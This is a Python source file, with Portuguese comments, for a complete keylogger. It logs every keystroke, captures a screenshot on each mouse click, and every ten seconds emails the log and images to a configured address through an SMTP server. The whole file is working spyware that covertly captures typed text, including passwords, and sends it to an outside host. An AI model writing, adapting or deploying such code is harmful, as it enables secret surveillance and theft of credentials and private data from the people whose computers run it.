from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re
import os
import pyautogui as py
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import time

# Configurações do e-mail
sender = "ff@example.com"
receiver = "gg@example.com"
username = "xxxxxxx"
password = "xxxxx"
smtp_server = "smtp.mailtrap.io"
smtp_port = 587

# Diretório para salvar temporariamente as capturas de tela e o log
diretorioTemp = "/home/felipe/Área de Trabalho/temp/"

try:
    os.mkdir(diretorioTemp)
except:
    pass

def format_key(key):
    key = str(key)
    key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.tab', '\t', key)
    key = re.sub(r'Key.backspace', 'apagar', key)
    key = re.sub(r'Key.*', '', key)
    return key

def on_press(tecla):
    tecla = format_key(tecla)
    with open(os.path.join(diretorioTemp, 'keylogger.log'), 'a') as log:
        if tecla == "apagar":
            log.seek(0, os.SEEK_END)
            log.seek(log.tell() - 1, os.SEEK_SET)
            log.truncate()
        else:
            log.write(tecla + ' ')

def on_click(x, y, button, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H-%M-%S")
        minhaPrint.save(os.path.join(diretorioTemp, "printKeylogger_" + horarioPrint + ".jpg"))

def send_email():
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = receiver
    msg['Subject'] = "Keylogger Report"

    # Verifica se o arquivo de log existe
    log_path = os.path.join(diretorioTemp, 'keylogger.log')
    if os.path.exists(log_path):
        with open(log_path, 'r') as log_file:
            log_content = log_file.read()
        # Adiciona marcação para links
        log_content = re.sub(r'(https?://\S+)', r'<a href="\1">\1</a>', log_content)
        attachment = MIMEText(log_content, 'html')
        attachment.add_header('Content-Disposition', 'attachment', filename='keylogger.log')
        msg.attach(attachment)

    # Anexa as capturas de tela ao e-mail
    for file in os.listdir(diretorioTemp):
        if file.endswith('.jpg'):
            with open(os.path.join(diretorioTemp, file), 'rb') as image_file:
                image = MIMEImage(image_file.read(), name=os.path.basename(file))
            msg.attach(image)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(username, password)
        server.send_message(msg)

keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

keyboardListener.start()
mouseListener.start()

while True:
    send_email()
    time.sleep(10)
